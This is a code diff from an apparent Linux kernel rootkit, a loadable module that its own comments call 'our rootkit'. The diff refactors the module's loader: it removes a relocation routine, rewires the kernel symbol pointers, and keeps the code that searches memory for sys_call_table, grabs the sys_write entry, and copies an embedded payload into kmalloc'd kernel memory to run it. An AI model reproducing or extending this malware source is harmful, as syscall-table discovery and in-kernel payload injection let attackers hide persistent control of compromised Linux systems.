@@ -65,25 +65,6 @@ int disassemble(void *code, size_t code_len);
 void *search_sct(void);
 void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
 void hook_kernel_funcs(void);
-int relocate(unsigned char *start, unsigned char *end, unsigned long base, unsigned long from)
-{
-    int count = 0;
-    unsigned char *s;
-    unsigned long size = (unsigned long) end - (unsigned long) start;
-
-    pinfo("relocating start at %p, end %p\n", start, end);
-    base -= (unsigned long) from;
-    for (s = start; s <= (end); s++) {
-        unsigned int *p = (unsigned int *) s;
-        if ((*p >= (unsigned int) from) && (*p <= (((unsigned int) (from + size))))) {
-            *p += base;
-            s += 3;
-            count++;
-        }
-    }
-    pinfo("relocate: %d relocations made\n", count);
-    return count;
-}
 
 /*
  * Global variables.
@@ -107,23 +88,23 @@ int init_module(void)
 	/*
 	 * Load Linux Kernel exported symbols for our rootkit.
 	 */
-    *f_kmalloc() = kmalloc;
-    *f_kfree() = kfree;
-    *f_find_vpid() = find_vpid;
-    *f_vscnprintf() = vscnprintf;
+    f_kmalloc = kmalloc;
+    f_kfree = kfree;
+    f_find_vpid = find_vpid;
+    f_vscnprintf = vscnprintf;
 
 	/*
 	 * Search sys_call_table[] address.
 	 */
-	*sys_call_table() = search_sct();
-	if (*sys_call_table() == NULL) {
+	sys_call_table = search_sct();
+	if (sys_call_table == NULL) {
 		return 0;
 	}
     
 	/*
      * Linux Kernel syscall symbols for our rootkit.
      */
-    *f_sys_write() = (*sys_call_table())[__NR_write]; // now we can print into stdout and stderr =)
+    f_sys_write = sys_call_table[__NR_write]; // now we can print into stdout and stderr =)
 
 /*
 	pinfo("%p\n", __rdmsr(MSR_LSTAR));
@@ -157,7 +138,7 @@ int init_module(void)
 	*/
 //	return 0;
 
-	pinfo("Hurra! sys_call_table = %p\n", *sys_call_table());
+	pinfo("Hurra! sys_call_table = %p\n", sys_call_table);
 
 	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
 
@@ -165,7 +146,7 @@ int init_module(void)
      * Insert out rootkit into memory.
 	 */
 	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
-	kernel_addr = (*f_kmalloc())(kernel_paglen, GFP_KERNEL);
+	kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
 	if (kernel_addr != NULL) {
 		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
 		/*
@@ -177,7 +158,7 @@ int init_module(void)
 		memcpy(kernel_addr, &kernel_start, kernel_len);
 		pinfo("kernel is now copied to kernel_addr.\n");
 		
-		//disassemble(kernel_addr, ((unsigned long)&kernel_code_end - (unsigned long)&kernel_start));
+		//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));
 
 		kernel_test();
 		pinfo("kernel_test execution from LKM successful.\n");
